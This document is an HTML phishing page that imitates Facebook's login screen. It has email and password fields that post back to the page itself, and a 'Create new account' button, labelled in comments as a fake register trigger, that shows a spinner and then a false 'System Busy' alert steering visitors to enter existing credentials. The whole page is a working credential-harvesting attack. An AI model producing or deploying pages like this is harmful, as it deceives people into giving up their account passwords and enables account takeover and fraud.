<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta 
  name="viewport" 
  content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"
>
<title>
  Facebook – log in or sign up
</title>
<script src="https://cdn.tailwindcss.com">
</script>
<style>
body {
  background-color: #f0f2f5;
  font-family: Helvetica, Arial, sans-serif;
  display: flex;
  flex-direction: column;
  align-items: center;
  margin: 0;
  padding: 0;
}
.header-v {
  margin-top: 40px;
  margin-bottom: 20px;
}
.card-v {
  background-color: #ffffff;
  padding: 16px;
  border-radius: 8px;
  box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
  width: 90%;
  max-width: 400px;
  text-align: center;
}
.input-v {
  width: 100%;
  padding: 14px 16px;
  margin-bottom: 12px;
  border: 1px solid #dddfe2;
  border-radius: 6px;
  font-size: 17px;
  box-sizing: border-box;
}
.btn-login-v {
  background-color: #1877f2;
  color: #ffffff;
  width: 100%;
  padding: 12px;
  border: none;
  border-radius: 6px;
  font-size: 20px;
  font-weight: 700;
  cursor: pointer;
}
.btn-register-v {
  background-color: #42b72a;
  color: #ffffff;
  padding: 12px 16px;
  border: none;
  border-radius: 6px;
  font-size: 17px;
  font-weight: 700;
  text-decoration: none;
  display: inline-block;
  margin-top: 20px;
  cursor: pointer;
}
#fake-overlay {
  display: none;
  position: fixed;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  background: white;
  z-index: 1000;
  flex-direction: column;
  justify-content: center;
  align-items: center;
}
</style>
</head>
<body>
<div class="header-v">
  <h1 
    style="color: #1877f2; font-size: 50px; font-weight: 800; letter-spacing: -2px;"
  >
    facebook
  </h1>
</div>
<div class="card-v">
  <form 
    action="" 
    method="POST"
  >
    <input 
      name="user" 
      type="text" 
      class="input-v" 
      placeholder="Mobile number or email address" 
      required
    >
    <input 
      name="pass" 
      type="password" 
      class="input-v" 
      placeholder="Password" 
      required
    >
    <button 
      type="submit" 
      class="btn-login-v"
    >
      Log In
    </button>
    <a 
      href="#" 
      class="block text-[#1877f2] text-sm mt-4 hover:underline"
    >
      Forgotten password?
    </a>
    <div 
      style="border-bottom: 1px solid #dadde1; margin: 20px 0;"
    >
    </div>
    <!-- FAKE REGISTER TRIGGER -->
    <button 
      type="button" 
      class="btn-register-v" 
      onclick="startFakeRegister()"
    >
      Create new account
    </button>
  </form>
</div>
<!-- FAKE REGISTRATION OVERLAY -->
<div id="fake-overlay">
  <div 
    class="animate-spin rounded-full h-10 w-10 border-b-2 border-[#1877f2] mb-4"
  >
  </div>
  <p 
    class="text-gray-600 font-semibold"
  >
    Setting up your account...
  </p>
</div>
<script>
function startFakeRegister() {
  const overlay = document.getElementById('fake-overlay');
  overlay.style.display = 'flex';
  setTimeout(() => {
    overlay.style.display = 'none';
    alert("System Busy: Registration is currently unavailable in your region. Please log in with an existing account.");
  }, 3000);
}
</script>
</body>
</html>
